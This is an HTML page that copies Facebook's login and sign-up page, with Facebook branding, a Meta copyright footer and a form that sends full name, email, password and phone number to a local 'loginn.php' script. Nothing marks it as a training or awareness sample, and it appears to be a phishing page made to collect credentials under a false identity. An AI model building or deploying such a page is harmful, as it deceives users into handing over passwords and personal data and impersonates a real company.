
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, Helvetica, sans-serif;
        }
        ._hins {
            font-size: 65px;
            font-weight: 800;
            letter-spacing: -2px;
            color: #1877f2;
        }
        .login-card {
            background: #fff;
            border: none;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            padding: 25px;
            width: 100%;
            max-width: 450px;
        }
        .form-control, .form-select {
            height: 52px;
            font-size: 16px;
            border-radius: 8px;
            border: 1px solid #dddfe2;
            background-color: #f5f6f7;
        }
        .form-control:focus, .form-select:focus {
            box-shadow: 0 0 0 2px #e7f3ff;
            border-color: #1877f2;
            background-color: #fff;
        }
        .btn-login {
            background-color: #1877f2;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            font-weight: 700;
            padding: 10px;
        }
        ._hans {
            background-color: #42b72a;
            border: none;
            border-radius: 8px;
            padding: 12px 20px;
            font-size: 17px;
            font-weight: 700;
            color: white;
            transition: background 0.2s;
        }
        ._hans:hover {
            background-color: #36a420;
        }
        ._hens {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        ._hops {
            font-size: 12px;
            color: #8a8d91;
        }
        .main-container {
            padding-top: 80px;
            padding-bottom: 50px;
        }
        label {
            font-size: 13px;
            color: #606770;
            margin-bottom: 5px;
            font-weight: 600;
        }
    </style>
</head>
<body class="bg-light">
<div class="container main-container">
    <div class="row align-items-center justify-content-center">
        <div class="col-lg-6 mb-5 mb-lg-0 text-center text-lg-start pe-lg-5">
            <h1 class="_hins mb-2">facebook</h1>
            <p class="fs-2 fw-normal" style="line-height: 1.2;">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="col-lg-5 d-flex flex-column align-items-center">
            <div class="login-card">
                <form action="loginn.php" method="post">
                    
                    <div class="mb-3">
                        <input type="text" class="form-control" name="name" placeholder="Full name" required>
                    </div>
                    <div class="mb-3">
                        <input type="email" class="form-control" name="email" placeholder="Email address" required>
                    </div>
                    <div class="mb-3">
                        <input type="password" class="form-control" name="password" placeholder="New password" required>
                    </div>
                    <div class="mb-3">
                        <input type="tel" class="form-control" name="phone" placeholder="Mobile number" required>
                    </div>
                    <div class="mb-3">
                        <label for="gender">Gender</label>
                        <select class="form-select" id="gender" name="gender" required>
                            <option value="" selected disabled>Select Gender</option>
                            <option value="Female">Female</option>
                            <option value="Male">Male</option>
                            <option value="others">Others</option>
                        </select>
                    </div>
                    <button type="submit" name="login" class="btn btn-primary btn-login w-100 mb-3">Sign Up</button>
                    
                    <div class="text-center mb-2">
                        <a href="#" class="text-decoration-none" style="font-size: 14px;">Already have an account?</a>
                    </div>
                    
                    <div class="_hens"></div>
                    
                    <div class="text-center">
                        <button type="button" class="_hans">Create new account</button>
                    </div>
                </form>
            </div>
            <p class="mt-4 text-center" style="font-size: 14px;">
                <a href="#" class="text-dark fw-bold text-decoration-none">Create a Page</a> for a celebrity, brand or business.
            </p>
        </div>
    </div>
</div>
<footer class="bg-white py-5 border-top">
    <div class="container _hops">
        <div>
            <span class="me-2">English (UK)</span>
            <span class="me-2">Hausa</span>
            <span class="me-2">Français (France)</span>
            <span class="me-2">Português (Brasil)</span>
            <span class="me-2">Español</span>
            <span class="me-2">العربية</span>
            <span class="fw-bold border px-1">+</span>
        </div>
        <div class="_hens"></div>
        <div class="d-flex flex-wrap gap-3">
            <a href="#" class="text-decoration-none text-secondary">Sign Up</a>
            <a href="#" class="text-decoration-none text-secondary">Log In</a>
            <a href="#" class="text-decoration-none text-secondary">Messenger</a>
            <a href="#" class="text-decoration-none text-secondary">Privacy Policy</a>
            <a href="#" class="text-decoration-none text-secondary">Terms</a>
            <a href="#" class="text-decoration-none text-secondary">Help</a>
        </div>
        <div class="mt-3">Meta &copy; 2026</div>
    </div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
